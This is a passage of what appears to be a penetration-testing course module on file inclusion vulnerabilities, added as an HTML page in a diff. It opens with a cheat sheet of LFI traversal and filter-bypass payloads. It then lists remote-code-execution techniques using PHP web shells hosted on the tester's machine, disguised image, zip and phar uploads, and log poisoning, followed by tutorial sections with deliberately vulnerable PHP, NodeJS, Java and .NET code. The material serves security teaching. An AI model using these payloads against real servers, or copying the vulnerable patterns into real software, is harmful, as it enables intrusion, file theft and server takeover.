@@ -1,0 +1,1191 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="18-file-inclusion">18. File inclusion</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Basic LFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/etc/passwd</code></td>
+<td>Basic LFI</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd</code></td>
+<td>LFI with path traversal</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/../../../etc/passwd</code></td>
+<td>LFI with name prefix</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>LFI with approved path</td>
+</tr>
+<tr>
+<td><strong>LFI Bypasses</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>Bypass basic path traversal filter</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>Bypass filters with URL encoding</td>
+</tr>
+<tr>
+<td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>Bypass appended extension with path truncation (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>Bypass appended extension with null byte (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>Read PHP with base64 filter</td>
+</tr>
+</tbody>
+</table>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP Wrappers</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>RCE with data wrapper</td>
+</tr>
+<tr>
+<td><code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
+<td>RCE with input wrapper</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</code></td>
+<td>RCE with expect wrapper</td>
+</tr>
+<tr>
+<td><strong>RFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>Host web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>Include remote PHP web shell</td>
+</tr>
+<tr>
+<td><strong>LFI + Upload</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif</code></td>
+<td>Create malicious image</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded image</td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>Create malicious zip archive 'as jpg'</td>
+</tr>
+<tr>
+<td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded zip</td>
+</tr>
+<tr>
+<td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>Create malicious phar 'as jpg'</td>
+</tr>
+<tr>
+<td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded phar</td>
+</tr>
+<tr>
+<td><strong>Log Poisoning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>Poison PHP session with web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
+<td>Poison server log</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+</tbody>
+</table>
+<h3 id="misc">Misc</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td>Fuzz page parameters</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td>Fuzz LFI payloads</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td>Fuzz webroot path</td>
+</tr>
+<tr>
+<td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code></td>
+<td>Fuzz server configurations</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlists</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="file-inclusion-functions">File Inclusion Functions</h3>
+<table data-header-hidden=""><thead><tr><th width="213"></th><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td><strong>Function</strong></td><td align="center"><strong>Read Content</strong></td><td align="center"><strong>Execute</strong></td><td align="center"><strong>Remote URL</strong></td></tr><tr><td><strong>PHP</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><code>require()</code>/<code>require_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td><code>file_get_contents()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><code>fopen()</code>/<code>file()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><strong>NodeJS</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>fs.readFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>fs.sendFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>res.render()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><strong>Java</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>import</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><strong>.NET</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>@Html.Partial()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>@Html.RemotePartial()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><code>Response.WriteFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr></tbody></table>
+
+<h2 id="intro-to-file-inclusions">Intro to File Inclusions</h2>
+<p>Many modern back-end languages, such as <code>PHP</code>, <code>Javascript</code>, or <code>Java</code>, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion">Local File Inclusion (LFI)</a> vulnerability.</p>
+<hr>
+<h3 id="local-file-inclusion-lfi-">Local File Inclusion (LFI)</h3>
+<p>The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the <code>header</code>, <code>navigation bar</code>, and <code>footer</code>, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like <code>/index.php?page=about</code>, where <code>index.php</code> sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called <code>about.php</code>. As we have control over the <code>about</code> portion of the request, it may be possible to have the web application grab other files and display them on the page.</p>
+<p>LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.</p>
+<hr>
+<h3 id="examples-of-vulnerable-code">Examples of Vulnerable Code</h3>
+<p>Let's look at some examples of code vulnerable to File Inclusion to understand how such vulnerabilities occur. As mentioned earlier, file Inclusion vulnerabilities can occur in many of the most popular web servers and development frameworks, like <code>PHP</code>, <code>NodeJS</code>, <code>Java</code>, <code>.Net</code>, and many others. Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.</p>
+<p>Such a file could be a dynamic header or different content based on the user-specified language. For example, the page may have a <code>?language</code> GET parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different <code>language</code> parameter (e.g. <code>?language=es</code>). In such cases, changing the language may change the directory the web application is loading the pages from (e.g. <code>/en/</code> or <code>/es/</code>). If we have control over the path being loaded, then we may be able to exploit this vulnerability to read other files and potentially reach remote code execution.</p>
+<p><strong>PHP</strong></p>
+<p>In <code>PHP</code>, we may use the <code>include()</code> function to load a local or a remote file as we load a page. If the <code>path</code> passed to the <code>include()</code> is taken from a user-controlled parameter, like a <code>GET</code> parameter, and <code>the code does not explicitly filter and sanitize the user input</code>, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'language'</span>])) {
+    <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">'language'</span>]);
+}
+</code></pre>
+<p>We see that the <code>language</code> parameter is directly passed to the <code>include()</code> function. So, any path we pass in the <code>language</code> parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the <code>include()</code> function, as there are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include <code>include_once()</code>, <code>require()</code>, <code>require_once()</code>, <code>file_get_contents()</code>, and several others as well.</p>
+<p>Note: In this module, we will mostly focus on PHP web applications running on a Linux back-end server. However, most techniques and attacks would work on the majority of other frameworks, so our examples would be the same with a web application written in any other language.</p>
+<p><strong>NodeJS</strong></p>
+<p>Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter <code>language</code> is used to control what data is written to a page:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">if</span>(req.query.language) {
+    fs.readFile(path.join(__dirname, req.query.language), <span class="hljs-function"><span class="hljs-keyword">function</span></span> (err, <span class="hljs-keyword">data</span>) {
+        res.<span class="hljs-built_in">write</span>(<span class="hljs-keyword">data</span>);
+    });
+}
+</code></pre>
+<p>As we can see, whatever parameter passed from the URL gets used by the <code>readfile</code> function, which then writes the file content in the HTTP response. Another example is the <code>render()</code> function in the <code>Express.js</code> framework. The following example shows uses the <code>language</code> parameter to determine which directory it should pull the <code>about.html</code> page from:</p>
+<p>Code: js</p>
+<pre><code class="lang-js">app.get(<span class="hljs-string">"/about/:language"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{
+    res.render(<span class="hljs-string">`/<span class="hljs-subst">${req.params.language}</span>/about.html`</span>);
+});
+</code></pre>
+<p>Unlike our earlier examples where GET parameters were specified after a (<code>?</code>) character in the URL, the above example takes the parameter from the URL path (e.g. <code>/about/en</code> or <code>/about/es</code>). As the parameter is directly used within the <code>render()</code> function to specify the rendered file, we can change the URL to show a different file instead.</p>
+<p><strong>Java</strong></p>
+<p>The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the <code>include</code> function:</p>
+<p>Code: jsp</p>
+<pre><code class="lang-jsp"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">c:if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"${not empty param.language}"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">"&lt;%=</span></span></span><span class="ruby"> request.getParameter(<span class="hljs-string">'language'</span>) </span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt;"</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">c:if</span>&gt;</span></span>
+</code></pre>
+<p>The <code>include</code> function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. The <code>import</code> function may also be used to render a local file or a URL, such as the following example:</p>
+<p>Code: jsp</p>
+<pre><code class="lang-jsp"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">c:import</span> <span class="hljs-attr">url</span>= <span class="hljs-string">"&lt;%=</span></span></span><span class="ruby"> request.getParameter(<span class="hljs-string">'language'</span>) </span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt;"</span>/&gt;</span></span>
+</code></pre>
+<p><strong>.NET</strong></p>
+<p>Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. The <code>Response.WriteFile</code> function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:</p>
+<p>Code: cs</p>
+<pre><code class="lang-cs">@<span class="hljs-keyword">if</span> (!string.IsNullOrEmpty(HttpContext.Request.Query[<span class="hljs-string">'language'</span>])) {
+    &lt;% <span class="hljs-selector-tag">Response</span><span class="hljs-selector-class">.WriteFile</span>("&lt;% <span class="hljs-selector-tag">HttpContext</span><span class="hljs-selector-class">.Request</span><span class="hljs-selector-class">.Query</span><span class="hljs-selector-attr">['language']</span> %&gt;"); %&gt; 
+}
+</code></pre>
+<p>Furthermore, the <code>@Html.Partial()</code> function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:</p>
+<p>Code: cs</p>
+<pre><code class="lang-cs">@<span class="hljs-keyword">Html</span>.<span class="hljs-keyword">Partial</span>(<span class="hljs-keyword">HttpContext</span>.<span class="hljs-keyword">Request</span>.<span class="hljs-keyword">Query</span>['<span class="hljs-keyword">language</span>'])
+</code></pre>
+<p>Finally, the <code>include</code> function may be used to render local files or remote URLs, and may also execute the specified files as well:</p>
+<p>Code: cs</p>
+<pre><code class="lang-cs"><span class="xml"><span class="hljs-comment">&lt;!--#include file="&lt;%</span></span><span class="ruby"> HttpContext.Request.Query[<span class="hljs-string">'language'</span>] </span><span class="xml"><span class="hljs-comment">%&gt;"--&gt;</span></span>
+</code></pre>
+<h3 id="read-vs-execute">Read vs Execute</h3>
+<p>From all of the above examples, we can see that File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates.</p>
+<p>The most important thing to keep in mind is that <code>some of the above functions only read the content of the specified files, while others also execute the specified files</code>. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.</p>
+<p>The following table shows which functions may execute files and which only read file content:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th style="text-align:center"><strong>Read Content</strong></th>
+<th style="text-align:center"><strong>Execute</strong></th>
+<th style="text-align:center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>require()</code>/<code>require_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>fopen()</code>/<code>file()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">❌</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+</tbody>
+</table>
+<p>This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the source code without code execution. Furthermore, if we had access to the source code in a whitebox exercise or in a code audit, knowing these actions helps us in identifying potential File Inclusion vulnerabilities, especially if they had user-controlled input going into them.</p>
+<p>In all cases, File Inclusion vulnerabilities are critical and may eventually lead to compromising the entire back-end server. Even if we were only able to read the web application source code, it may still allow us to compromise the web application, as it may reveal other vulnerabilities as mentioned earlier, and the source code may also contain database keys, admin credentials, or other sensitive information.</p>
+<h2 id="local-file-inclusion-lfi-">Local File Inclusion (LFI)</h2>
+<p>Now that we understand what File Inclusion vulnerabilities are and how they occur, we can start learning how we can exploit these vulnerabilities in different scenarios to be able to read the content of local files on the back-end server.</p>
+<hr>
+<h3 id="basic-lfi">Basic LFI</h3>
+<p>The exercise we have at the end of this section shows us an example of a web app that allows users to set their language to either English or Spanish:</p>
+<p><img src="storage\modules\23\basic\_lfi\_lang.png" alt=""></p>
+<p>If we select a language by clicking on it (e.g. <code>Spanish</code>), we see that the content text changes to spanish:</p>
+<p><img src="storage\modules\23\basic\_lfi\_es.png" alt=""></p>
+<p>We also notice that the URL includes a <code>language</code> parameter that is now set to the language we selected (<code>es.php</code>). There are several ways the content could be changed to match the language we specified. It may be pulling the content from a different database table based on the specified parameter, or it may be loading an entirely different version of the web app. However, as previously discussed, loading part of the page using template engines is the easiest and most common method utilized.</p>
+<p>So, if the web application is indeed pulling a file that is now being included in the page, we may be able to change the file being pulled to read the content of a different local file. Two common readable files that are available on most back-end servers are <code>/etc/passwd</code> on Linux and <code>C:\Windows\boot.ini</code> on Windows. So, let's change the parameter from <code>es</code> to <code>/etc/passwd</code>:</p>
+<p><img src="storage\modules\23\basic\_lfi\_lang\_passwd.png" alt=""></p>
+<p>As we can see, the page is indeed vulnerable, and we are able to read the content of the <code>passwd</code> file and identify what users exist on the back-end server.</p>
+<hr>
+<h3 id="path-traversal">Path Traversal</h3>
+<p>In the earlier example, we read a file by specifying its <code>absolute path</code> (e.g. <code>/etc/passwd</code>). This would work if the whole input was used within the <code>include()</code> function without any additions, like the following example:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'language'</span>]);
+</code></pre>
+<p>In this case, if we try to read <code>/etc/passwd</code>, then the <code>include()</code> function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the <code>language</code> parameter. For example, the <code>language</code> parameter may be used for the filename, and may be added after a directory, as follows:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"./languages/"</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'language'</span>]);
+</code></pre>
+<p>In this case, if we attempt to read <code>/etc/passwd</code>, then the path passed to <code>include()</code> would be (<code>./languages//etc/passwd</code>), and as this file does not exist, we will not be able to read anything:</p>
+<p><img src="storage\modules\23\traversal\_passwd\_failed.png" alt=""></p>
+<p>As expected, the verbose error returned shows us the string passed to the <code>include()</code> function, stating that there is no <code>/etc/passwd</code> in the languages directory.</p>
+<p>Note: We are only enabling PHP errors on this web application for educational purposes, so we can properly understand how the web application is handling our input. For production web applications, such errors should never be shown. Furthermore, all of our attacks should be possible without errors, as they do not rely on them.</p>
+<p>We can easily bypass this restriction by traversing directories using <code>relative paths</code>. To do so, we can add <code>../</code> before our file name, which refers to the parent directory. For example, if the full path of the languages directory is <code>/var/www/html/languages/</code>, then using <code>../index.php</code> would refer to the <code>index.php</code> file on the parent directory (i.e. <code>/var/www/html/index.php</code>).</p>
+<p>So, we can use this trick to go back several directories until we reach the root path (i.e. <code>/</code>), and then specify our absolute file path (e.g. <code>../../../../etc/passwd</code>), and the file should exist:</p>
+<p><img src="storage\modules\23\traversal\_passwd.png" alt=""></p>
+<p>As we can see, this time we were able to read the file regardless of the directory we were in. This trick would work even if the entire parameter was used in the <code>include()</code> function, so we can default to this technique, and it should work in both cases. Furthermore, if we were at the root path (<code>/</code>) and used <code>../</code> then we would still remain in the root path. So, if we were not sure of the directory the web application is in, we can add <code>../</code> many times, and it should not break the path (even if we do it a hundred times!).</p>
+<p>Tip: It can always be useful to be efficient and not add unnecessary <code>../</code> several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of <code>../</code> that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with <code>/var/www/html/</code> we are <code>3</code> directories away from the root path, so we can use <code>../</code> 3 times (i.e. <code>../../../</code>).</p>
+<hr>
+<h3 id="filename-prefix">Filename Prefix</h3>
+<p>In our previous example, we used the <code>language</code> parameter after the directory, so we could traverse the path to read the <code>passwd</code> file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"lang_"</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'language'</span>]);
+</code></pre>
+<p>In this case, if we try to traverse the directory with <code>../../../etc/passwd</code>, the final string would be <code>lang_../../../etc/passwd</code>, which is invalid:</p>
+<p><img src="storage\modules\23\lfi\_another\_example1.png" alt=""></p>
+<p>As expected, the error tells us that this file does not exist. so, instead of directly using path traversal, we can prefix a <code>/</code> before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories:</p>
+<p><img src="storage\modules\23\lfi\_another\_example\_passwd1.png" alt=""></p>
+<p>Note: This may not always work, as in this example a directory named <code>lang_/</code> may not exist, so our relative path may not be correct. Furthermore, <code>any prefix appended to our input may break some file inclusion techniques</code> we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.</p>
+<hr>
+<h3 id="appended-extensions">Appended Extensions</h3>
+<p>Another very common example is when an extension is appended to the <code>language</code> parameter, as follows:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'language'</span>] . <span class="hljs-string">".php"</span>);
+</code></pre>
+<p>This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read <code>/etc/passwd</code>, then the file included would be <code>/etc/passwd.php</code>, which does not exist:</p>
+<p><img src="storage\modules\23\lfi\_extension\_failed.png" alt=""></p>
+<p>There are several techniques that we can use to bypass this, and we will discuss them in upcoming sections.</p>
+<p>Exercise: Try to read any php file (e.g. index.php) through LFI, and see whether you would get its source code or if the file gets rendered as HTML instead.</p>
+<hr>
+<h3 id="second-order-attacks">Second-Order Attacks</h3>
+<p>As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a <code>Second Order Attack</code>. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.</p>
+<p>For example, a web application may allow us to download our avatar through a URL like (<code>/profile/$username/avatar.png</code>). If we craft a malicious LFI username (e.g. <code>../../../etc/passwd</code>), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.</p>
+<p>In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a <code>Second-Order</code> attack.</p>
+<p>Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a <code>?page</code> parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.</p>
+<p>Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.</p>
+<p>Note: All techniques mentioned in this section should work with any LFI vulnerability, regardless of the back-end development language or framework.</p>
+<h2 id="basic-bypasses">Basic Bypasses</h2>
+<p>In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.</p>
+<hr>
+<h3 id="non-recursive-path-traversal-filters">Non-Recursive Path Traversal Filters</h3>
+<p>One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (<code>../</code>) to avoid path traversals. For example:</p>
+<p>Code: php</p>
